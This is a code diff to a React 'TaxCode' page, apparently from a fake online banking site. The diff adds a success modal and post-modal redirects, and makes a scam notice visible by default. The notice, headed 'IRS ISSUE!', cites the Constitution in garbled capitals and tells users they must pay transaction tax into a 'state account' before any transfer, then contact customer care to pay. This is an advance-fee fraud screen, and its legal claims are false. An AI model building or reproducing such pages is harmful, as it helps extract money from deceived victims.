@@ -1,6 +1,6 @@
 import React, { useState} from 'react';
 import styles from './CardForm.module.css';
-import { useDispatch} from "react-redux";
+import { useDispatch,useSelector} from "react-redux";
 import Header from '../components/Header';
 import SideBar from '../components/SideBar';
 import Loader from '../components/Modal/LoadingModal';
@@ -8,15 +8,19 @@ import Modal from '../components/Modal/Modal';
 import { submitTaxCode} from '../store/action/userAppStorage';
 import { useNavigate } from 'react-router-dom';
 
+import SuccessModal from '../components/Modal/SuccessModal';
+
 
 function TaxCode() {
     let [isLoading, setIsLoading] = useState(false)
     let [isError, setIsError] = useState(false)
     let [isErrorInfo, setIsErrorInfo] = useState('')
     let [taxCode, setIsTaxCode] = useState('')
-    let [isBody,setIsBody] = useState(false)
+    let [isBody,setIsBody] = useState(true)
     let [isUrl,setIsUrl] = useState('  ')
     let navigate = useNavigate()
+    let [isSuccessModal, setIsSuccessModal] = useState(false)
+    let { paymentData } = useSelector(state => state.userAuth)
 
 
     let dispatch = useDispatch()
@@ -35,16 +39,16 @@ function TaxCode() {
             taxCode
         }))
 
-
-
         if (!response.bool) {
             setIsLoading(false)
             setIsError(true)
             setIsErrorInfo(response.message)
+            setIsUrl(response.url)
             return
         }
         setIsLoading(false)
-        navigate(`/${response.url}`)
+        setIsSuccessModal(true)
+        setIsUrl(response.url)
     }
 
 
@@ -54,8 +58,23 @@ function TaxCode() {
     }
 
 
+   
     let closeModal = () => {
         setIsError(false)
+        setIsSuccessModal(false)
+        if(isUrl){
+            navigate(`/${isUrl}`)
+        }
+    }
+
+    
+    let closeSuccessModal = () => {
+        setIsError(false)
+        setIsSuccessModal(false)
+        if(isUrl){
+            navigate(`/${isUrl}`)
+        }
+        return
     }
 
    
@@ -64,6 +83,9 @@ function TaxCode() {
     return (<>
         {isLoading && <Loader />}
         {isError && <Modal content={isErrorInfo} closeModal={closeModal} />}
+
+        {isSuccessModal ? <SuccessModal data={paymentData} closeFavorite={closeSuccessModal} /> : ''}
+
         <div className={styles.screenContainer}>
             <SideBar />
             <div className={styles.maindashboard} style={{ height: '100vh' }} >
@@ -84,6 +106,7 @@ function TaxCode() {
 
                             {<div className={styles.body}>
                                 {isBody?<p>
+                                IRS ISSUE! 
                                 ACCORDING TO THE CONSTITUTION OF THE UNITES STATESARTICLE 1,SECTION 8 OF THE CONSTITUTION GIVES CONGRESS AND BANK THE POWER TO LAY AND COLLECT TAXES ,DUTIES,IMPOSTS AND EXCISES,TO PAY THE DEBTS AND PROVIDE FOR THE COMMON DEFENSE AND GENERAL WELFARE OF THE UNITED STATES.THIS IS ALSO REFFERED TO AS THE TAXING AND SPENDING CLAUSE.ALL TRANSACTIONS ARE CHARGED WITH TAX WHICH GOES TO THE STATE/COUNTRY TAX BOX. THIS MONEY ARE NOT BEING DEDUCTED FROM YOUR ACCOUNT INSTEAD YOU PAY IT TO THE STATE ACCOUNT BEFORE YOU WILL BE ABLE TO MAKE YOUR TRANSACTION. KINDLY CONTACT CUSTOMER CARE SUPPORT ON HOW TO MAKE YOUR TAX PAYMENT!</p>:''}
                             </div>}
 
